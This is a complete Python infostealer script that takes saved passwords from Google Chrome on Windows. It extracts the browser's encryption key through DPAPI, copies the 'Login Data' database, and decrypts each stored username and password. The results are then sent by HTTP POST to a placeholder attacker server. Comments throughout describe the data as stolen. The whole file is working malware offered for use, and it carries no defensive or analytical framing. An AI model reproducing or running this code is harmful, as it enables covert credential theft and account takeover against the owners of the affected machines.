import os
import sqlite3
import win32crypt
import requests
from Crypto.Cipher import AES
import json
import base64
import shutil

# Remote server URL where stolen data will be sent (replace with your server)
SERVER_URL = 'http://your-server.com/steal_data'

# Function to get Chrome's local state file (which contains encryption key)
def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Trim the 'DPAPI' prefix
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

# Function to decrypt Chrome's stored passwords
def decrypt_password(ciphertext, key):
    iv = ciphertext[3:15]  # Initialization vector
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_password = cipher.decrypt(ciphertext[15:])
    return decrypted_password.decode('utf-8')

# Function to steal passwords from Chrome's 'Login Data' SQLite DB
def steal_chrome_passwords():
    passwords = []
    chrome_db = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
    
    # Create a copy of the database to avoid locking issues
    temp_db = os.path.join(os.environ['USERPROFILE'], 'LoginDataTemp.db')
    shutil.copyfile(chrome_db, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    
    encryption_key = get_encryption_key()
    
    for url, username, encrypted_password in cursor.fetchall():
        if encrypted_password:
            try:
                decrypted_password = decrypt_password(encrypted_password, encryption_key)
                if username or decrypted_password:
                    passwords.append({'url': url, 'username': username, 'password': decrypted_password})
            except Exception as e:
                continue
    
    conn.close()
    os.remove(temp_db)
    return passwords

# Function to send stolen data to the attacker's server
def send_data_to_server(data):
    try:
        response = requests.post(SERVER_URL, json=data)
        if response.status_code == 200:
            print("Data successfully sent to the server.")
        else:
            print("Failed to send data.")
    except requests.ConnectionError:
        print("Could not connect to the server.")

# Main function
def main():
    passwords = steal_chrome_passwords()
    if passwords:
        send_data_to_server(passwords)
    else:
        print("No passwords found.")

if __name__ == "__main__":
    main()
